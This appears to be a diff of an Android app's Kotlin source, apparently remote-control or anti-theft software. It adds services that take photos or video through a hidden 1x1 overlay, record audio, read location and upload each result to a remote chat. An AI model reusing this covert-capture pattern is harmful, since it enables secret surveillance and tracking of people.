@@ -1,39 +1,224 @@
 package com.save.me
 
-// === COROUTINE IMPORTS (FIX) ===
 import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.media.AudioManager
 import android.media.RingtoneManager
-import android.os.Build
-import android.os.Handler
-import android.os.IBinder
-import android.os.Looper
-import android.os.VibrationEffect
-import android.os.Vibrator
+import android.os.*
 import android.util.Log
-import androidx.core.app.NotificationCompat
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.Job
-import kotlinx.coroutines.launch
+import android.view.SurfaceView
+import android.view.WindowManager
+import kotlinx.coroutines.*
 import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
 import java.text.SimpleDateFormat
-import java.util.Date
-import java.util.Locale
+import java.util.*
 
-// ===============================
+/**
+ * CameraService: Takes photo or video in the background using a 1x1 overlay SurfaceView.
+ */
+class CameraService : Service() {
+    private val job = SupervisorJob()
+    private val scope = CoroutineScope(Dispatchers.Default + job)
 
+    companion object {
+        const val EXTRA_TYPE = "type"
+        const val EXTRA_CAMERA = "camera"
+        const val EXTRA_FLASH = "flash"
+        const val EXTRA_QUALITY = "quality"
+        const val EXTRA_DURATION = "duration"
+        const val EXTRA_CHAT_ID = "chat_id"
+
+        fun start(
+            context: Context,
+            type: String,
+            camera: String,
+            flash: Boolean,
+            quality: Int?,
+            duration: Int?,
+            chatId: String?
+        ) {
+            val intent = Intent(context, CameraService::class.java).apply {
+                putExtra(EXTRA_TYPE, type)
+                putExtra(EXTRA_CAMERA, camera)
+                putExtra(EXTRA_FLASH, flash)
+                quality?.let { putExtra(EXTRA_QUALITY, it) }
+                duration?.let { putExtra(EXTRA_DURATION, it) }
+                chatId?.let { putExtra(EXTRA_CHAT_ID, it) }
+            }
+            context.startForegroundService(intent)
+        }
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val type = intent?.getStringExtra(EXTRA_TYPE) ?: "photo"
+        val camera = intent?.getStringExtra(EXTRA_CAMERA) ?: "rear"
+        val flash = intent?.getBooleanExtra(EXTRA_FLASH, false) ?: false
+        val quality = intent?.getIntExtra(EXTRA_QUALITY, 720) ?: 720
+        val duration = intent?.getIntExtra(EXTRA_DURATION, 60) ?: 60
+        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)
+
+        scope.launch {
+            try {
+                val winMgr = getSystemService(WINDOW_SERVICE) as WindowManager
+                val surfaceView = SurfaceView(this@CameraService)
+                val lp = WindowManager.LayoutParams(
+                    1, 1,
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
+                    android.graphics.PixelFormat.TRANSLUCENT
+                )
+                withContext(Dispatchers.Main) {
+                    winMgr.addView(surfaceView, lp)
+                }
+                val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "remote_${System.currentTimeMillis()}.${if (type == "photo") "jpg" else "mp4"}")
+                CameraBackgroundHelper.takePhotoOrVideo(
+                    this@CameraService,
+                    surfaceView.holder,
+                    type,
+                    camera,
+                    flash,
+                    quality,
+                    duration,
+                    file
+                )
+                withContext(Dispatchers.Main) {
+                    winMgr.removeView(surfaceView)
+                }
+                Log.d("CameraService", "Saved $type to ${file.absolutePath}")
+                if (chatId != null) {
+                    UploadManager.queueUpload(file, chatId, type)
+                }
+            } catch (e: Exception) {
+                Log.e("CameraService", "Error: $e")
+            } finally {
+                stopSelf()
+            }
+        }
+        return START_NOT_STICKY
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        job.cancel()
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
+}
+
+/**
+ * AudioService: Records audio in the background.
+ */
+class AudioService : Service() {
+    private val job = SupervisorJob()
+    private val scope = CoroutineScope(Dispatchers.Default + job)
+
+    companion object {
+        const val EXTRA_DURATION = "duration"
+        const val EXTRA_CHAT_ID = "chat_id"
+
+        fun start(context: Context, duration: Int = 120, chatId: String? = null) {
+            val intent = Intent(context, AudioService::class.java).apply {
+                putExtra(EXTRA_DURATION, duration)
+                chatId?.let { putExtra(EXTRA_CHAT_ID, it) }
+            }
+            context.startForegroundService(intent)
+        }
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val duration = intent?.getIntExtra(EXTRA_DURATION, 120) ?: 120
+        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)
+        scope.launch {
+            try {
+                val file = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "remote_audio_${System.currentTimeMillis()}.m4a")
+                AudioBackgroundHelper.recordAudio(this@AudioService, file, duration)
+                Log.d("AudioService", "Saved audio to ${file.absolutePath}")
+                if (chatId != null) {
+                    UploadManager.queueUpload(file, chatId, "audio")
+                }
+            } catch (e: Exception) {
+                Log.e("AudioService", "Error: $e")
+            } finally {
+                stopSelf()
+            }
+        }
+        return START_NOT_STICKY
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        job.cancel()
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
+}
+
+/**
+ * LocationService: Gets current location and uploads it.
+ */
+class LocationService : Service() {
+    private val job = SupervisorJob()
+    private val scope = CoroutineScope(Dispatchers.Default + job)
+
+    companion object {
+        const val EXTRA_CHAT_ID = "chat_id"
+
+        fun start(context: Context, chatId: String? = null) {
+            val intent = Intent(context, LocationService::class.java)
+            chatId?.let { intent.putExtra(EXTRA_CHAT_ID, it) }
+            context.startForegroundService(intent)
+        }
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)
+        scope.launch {
+            try {
+                val location = LocationBackgroundHelper.getLastLocation(this@LocationService)
+                if (location != null) {
+                    Log.d("LocationService", "Location: ${location.latitude}, ${location.longitude}")
+                    if (chatId != null) {
+                        val file = File(getExternalFilesDir(null), "remote_location_${System.currentTimeMillis()}.json")
+                        FileOutputStream(file).use { out ->
+                            out.write(
+                                """{"lat":${location.latitude},"lng":${location.longitude},"timestamp":${location.time}}""".toByteArray()
+                            )
+                        }
+                        UploadManager.queueUpload(file, chatId, "location")
+                    }
+                } else {
+                    Log.e("LocationService", "Location not found")
+                }
+            } catch (e: Exception) {
+                Log.e("LocationService", "Error: $e")
+            } finally {
+                stopSelf()
+            }
+        }
+        return START_NOT_STICKY
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        job.cancel()
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
+}
+
+/**
+ * ForegroundActionService: Handles all-in-one remote actions, including camera, audio, location, ring, and vibrate.
+ */
 class ForegroundActionService : Service() {
     private var overlayView: OverlayCameraView? = null
     private var job: Job? = null
 
     override fun onCreate() {
         super.onCreate()
-        val notification = NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
+        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
             .setContentTitle("Remote Control Service")
             .setContentText("Running background actions...")
             .setSmallIcon(android.R.drawable.ic_menu_camera)
@@ -52,14 +237,15 @@ class ForegroundActionService : Service() {
                     "video" -> handleCameraAction("video", intent, chatId)
                     "audio" -> handleAudioRecording(intent, chatId)
                     "location" -> handleLocation(chatId)
-                    "ring" -> handleRing() // Always 5 seconds
-                    "vibrate" -> handleVibrate() // Always 2 seconds
+                    "ring" -> handleRing()
+                    "vibrate" -> handleVibrate()
                     else -> Log.e("ForegroundActionService", "Unknown action: $action")
                 }
             } catch (e: Exception) {
                 Log.e("ForegroundActionService", "Error in action $action", e)
             } finally {
                 removeCameraOverlay()
+                stopSelf()
             }
         }
         return START_NOT_STICKY
@@ -70,7 +256,7 @@ class ForegroundActionService : Service() {
         val cameraFacing = intent?.getStringExtra("camera") ?: "rear"
         val flash = intent?.getBooleanExtra("flash", false) ?: false
         val quality = intent?.getIntExtra("quality", 720) ?: 720
-        val duration = intent?.getIntExtra("duration", 60) ?: 60 // For video only
+        val duration = intent?.getIntExtra("duration", 60) ?: 60
         val outputFile = File(cacheDir, generateFileName(type, quality))
         val result: Boolean
         try {
@@ -96,7 +282,7 @@ class ForegroundActionService : Service() {
     }
 
     private suspend fun handleAudioRecording(intent: Intent?, chatId: String?) {
-        val duration = intent?.getIntExtra("duration", 60) ?: 60 // Default 1 min
+        val duration = intent?.getIntExtra("duration", 60) ?: 60
         val outputFile = File(cacheDir, "audio_${nowString()}.m4a")
         try {
             AudioBackgroundHelper.recordAudio(this, outputFile, duration)
@@ -128,7 +314,7 @@ class ForegroundActionService : Service() {
     }
 
     private fun handleRing() {
-        val duration = 5 // seconds, hardcoded as requested
+        val duration = 5
         val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
         val oldVolume = audioManager.getStreamVolume(AudioManager.STREAM_RING)
         val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
@@ -146,12 +332,13 @@ class ForegroundActionService : Service() {
     }
 
     private fun handleVibrate() {
-        val duration = 2000L // milliseconds, hardcoded as requested (2s)
+        val duration = 2000L
         try {
             val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
             } else {
+                @Suppress("DEPRECATION")
                 vibrator.vibrate(duration)
             }
         } catch (e: Exception) {
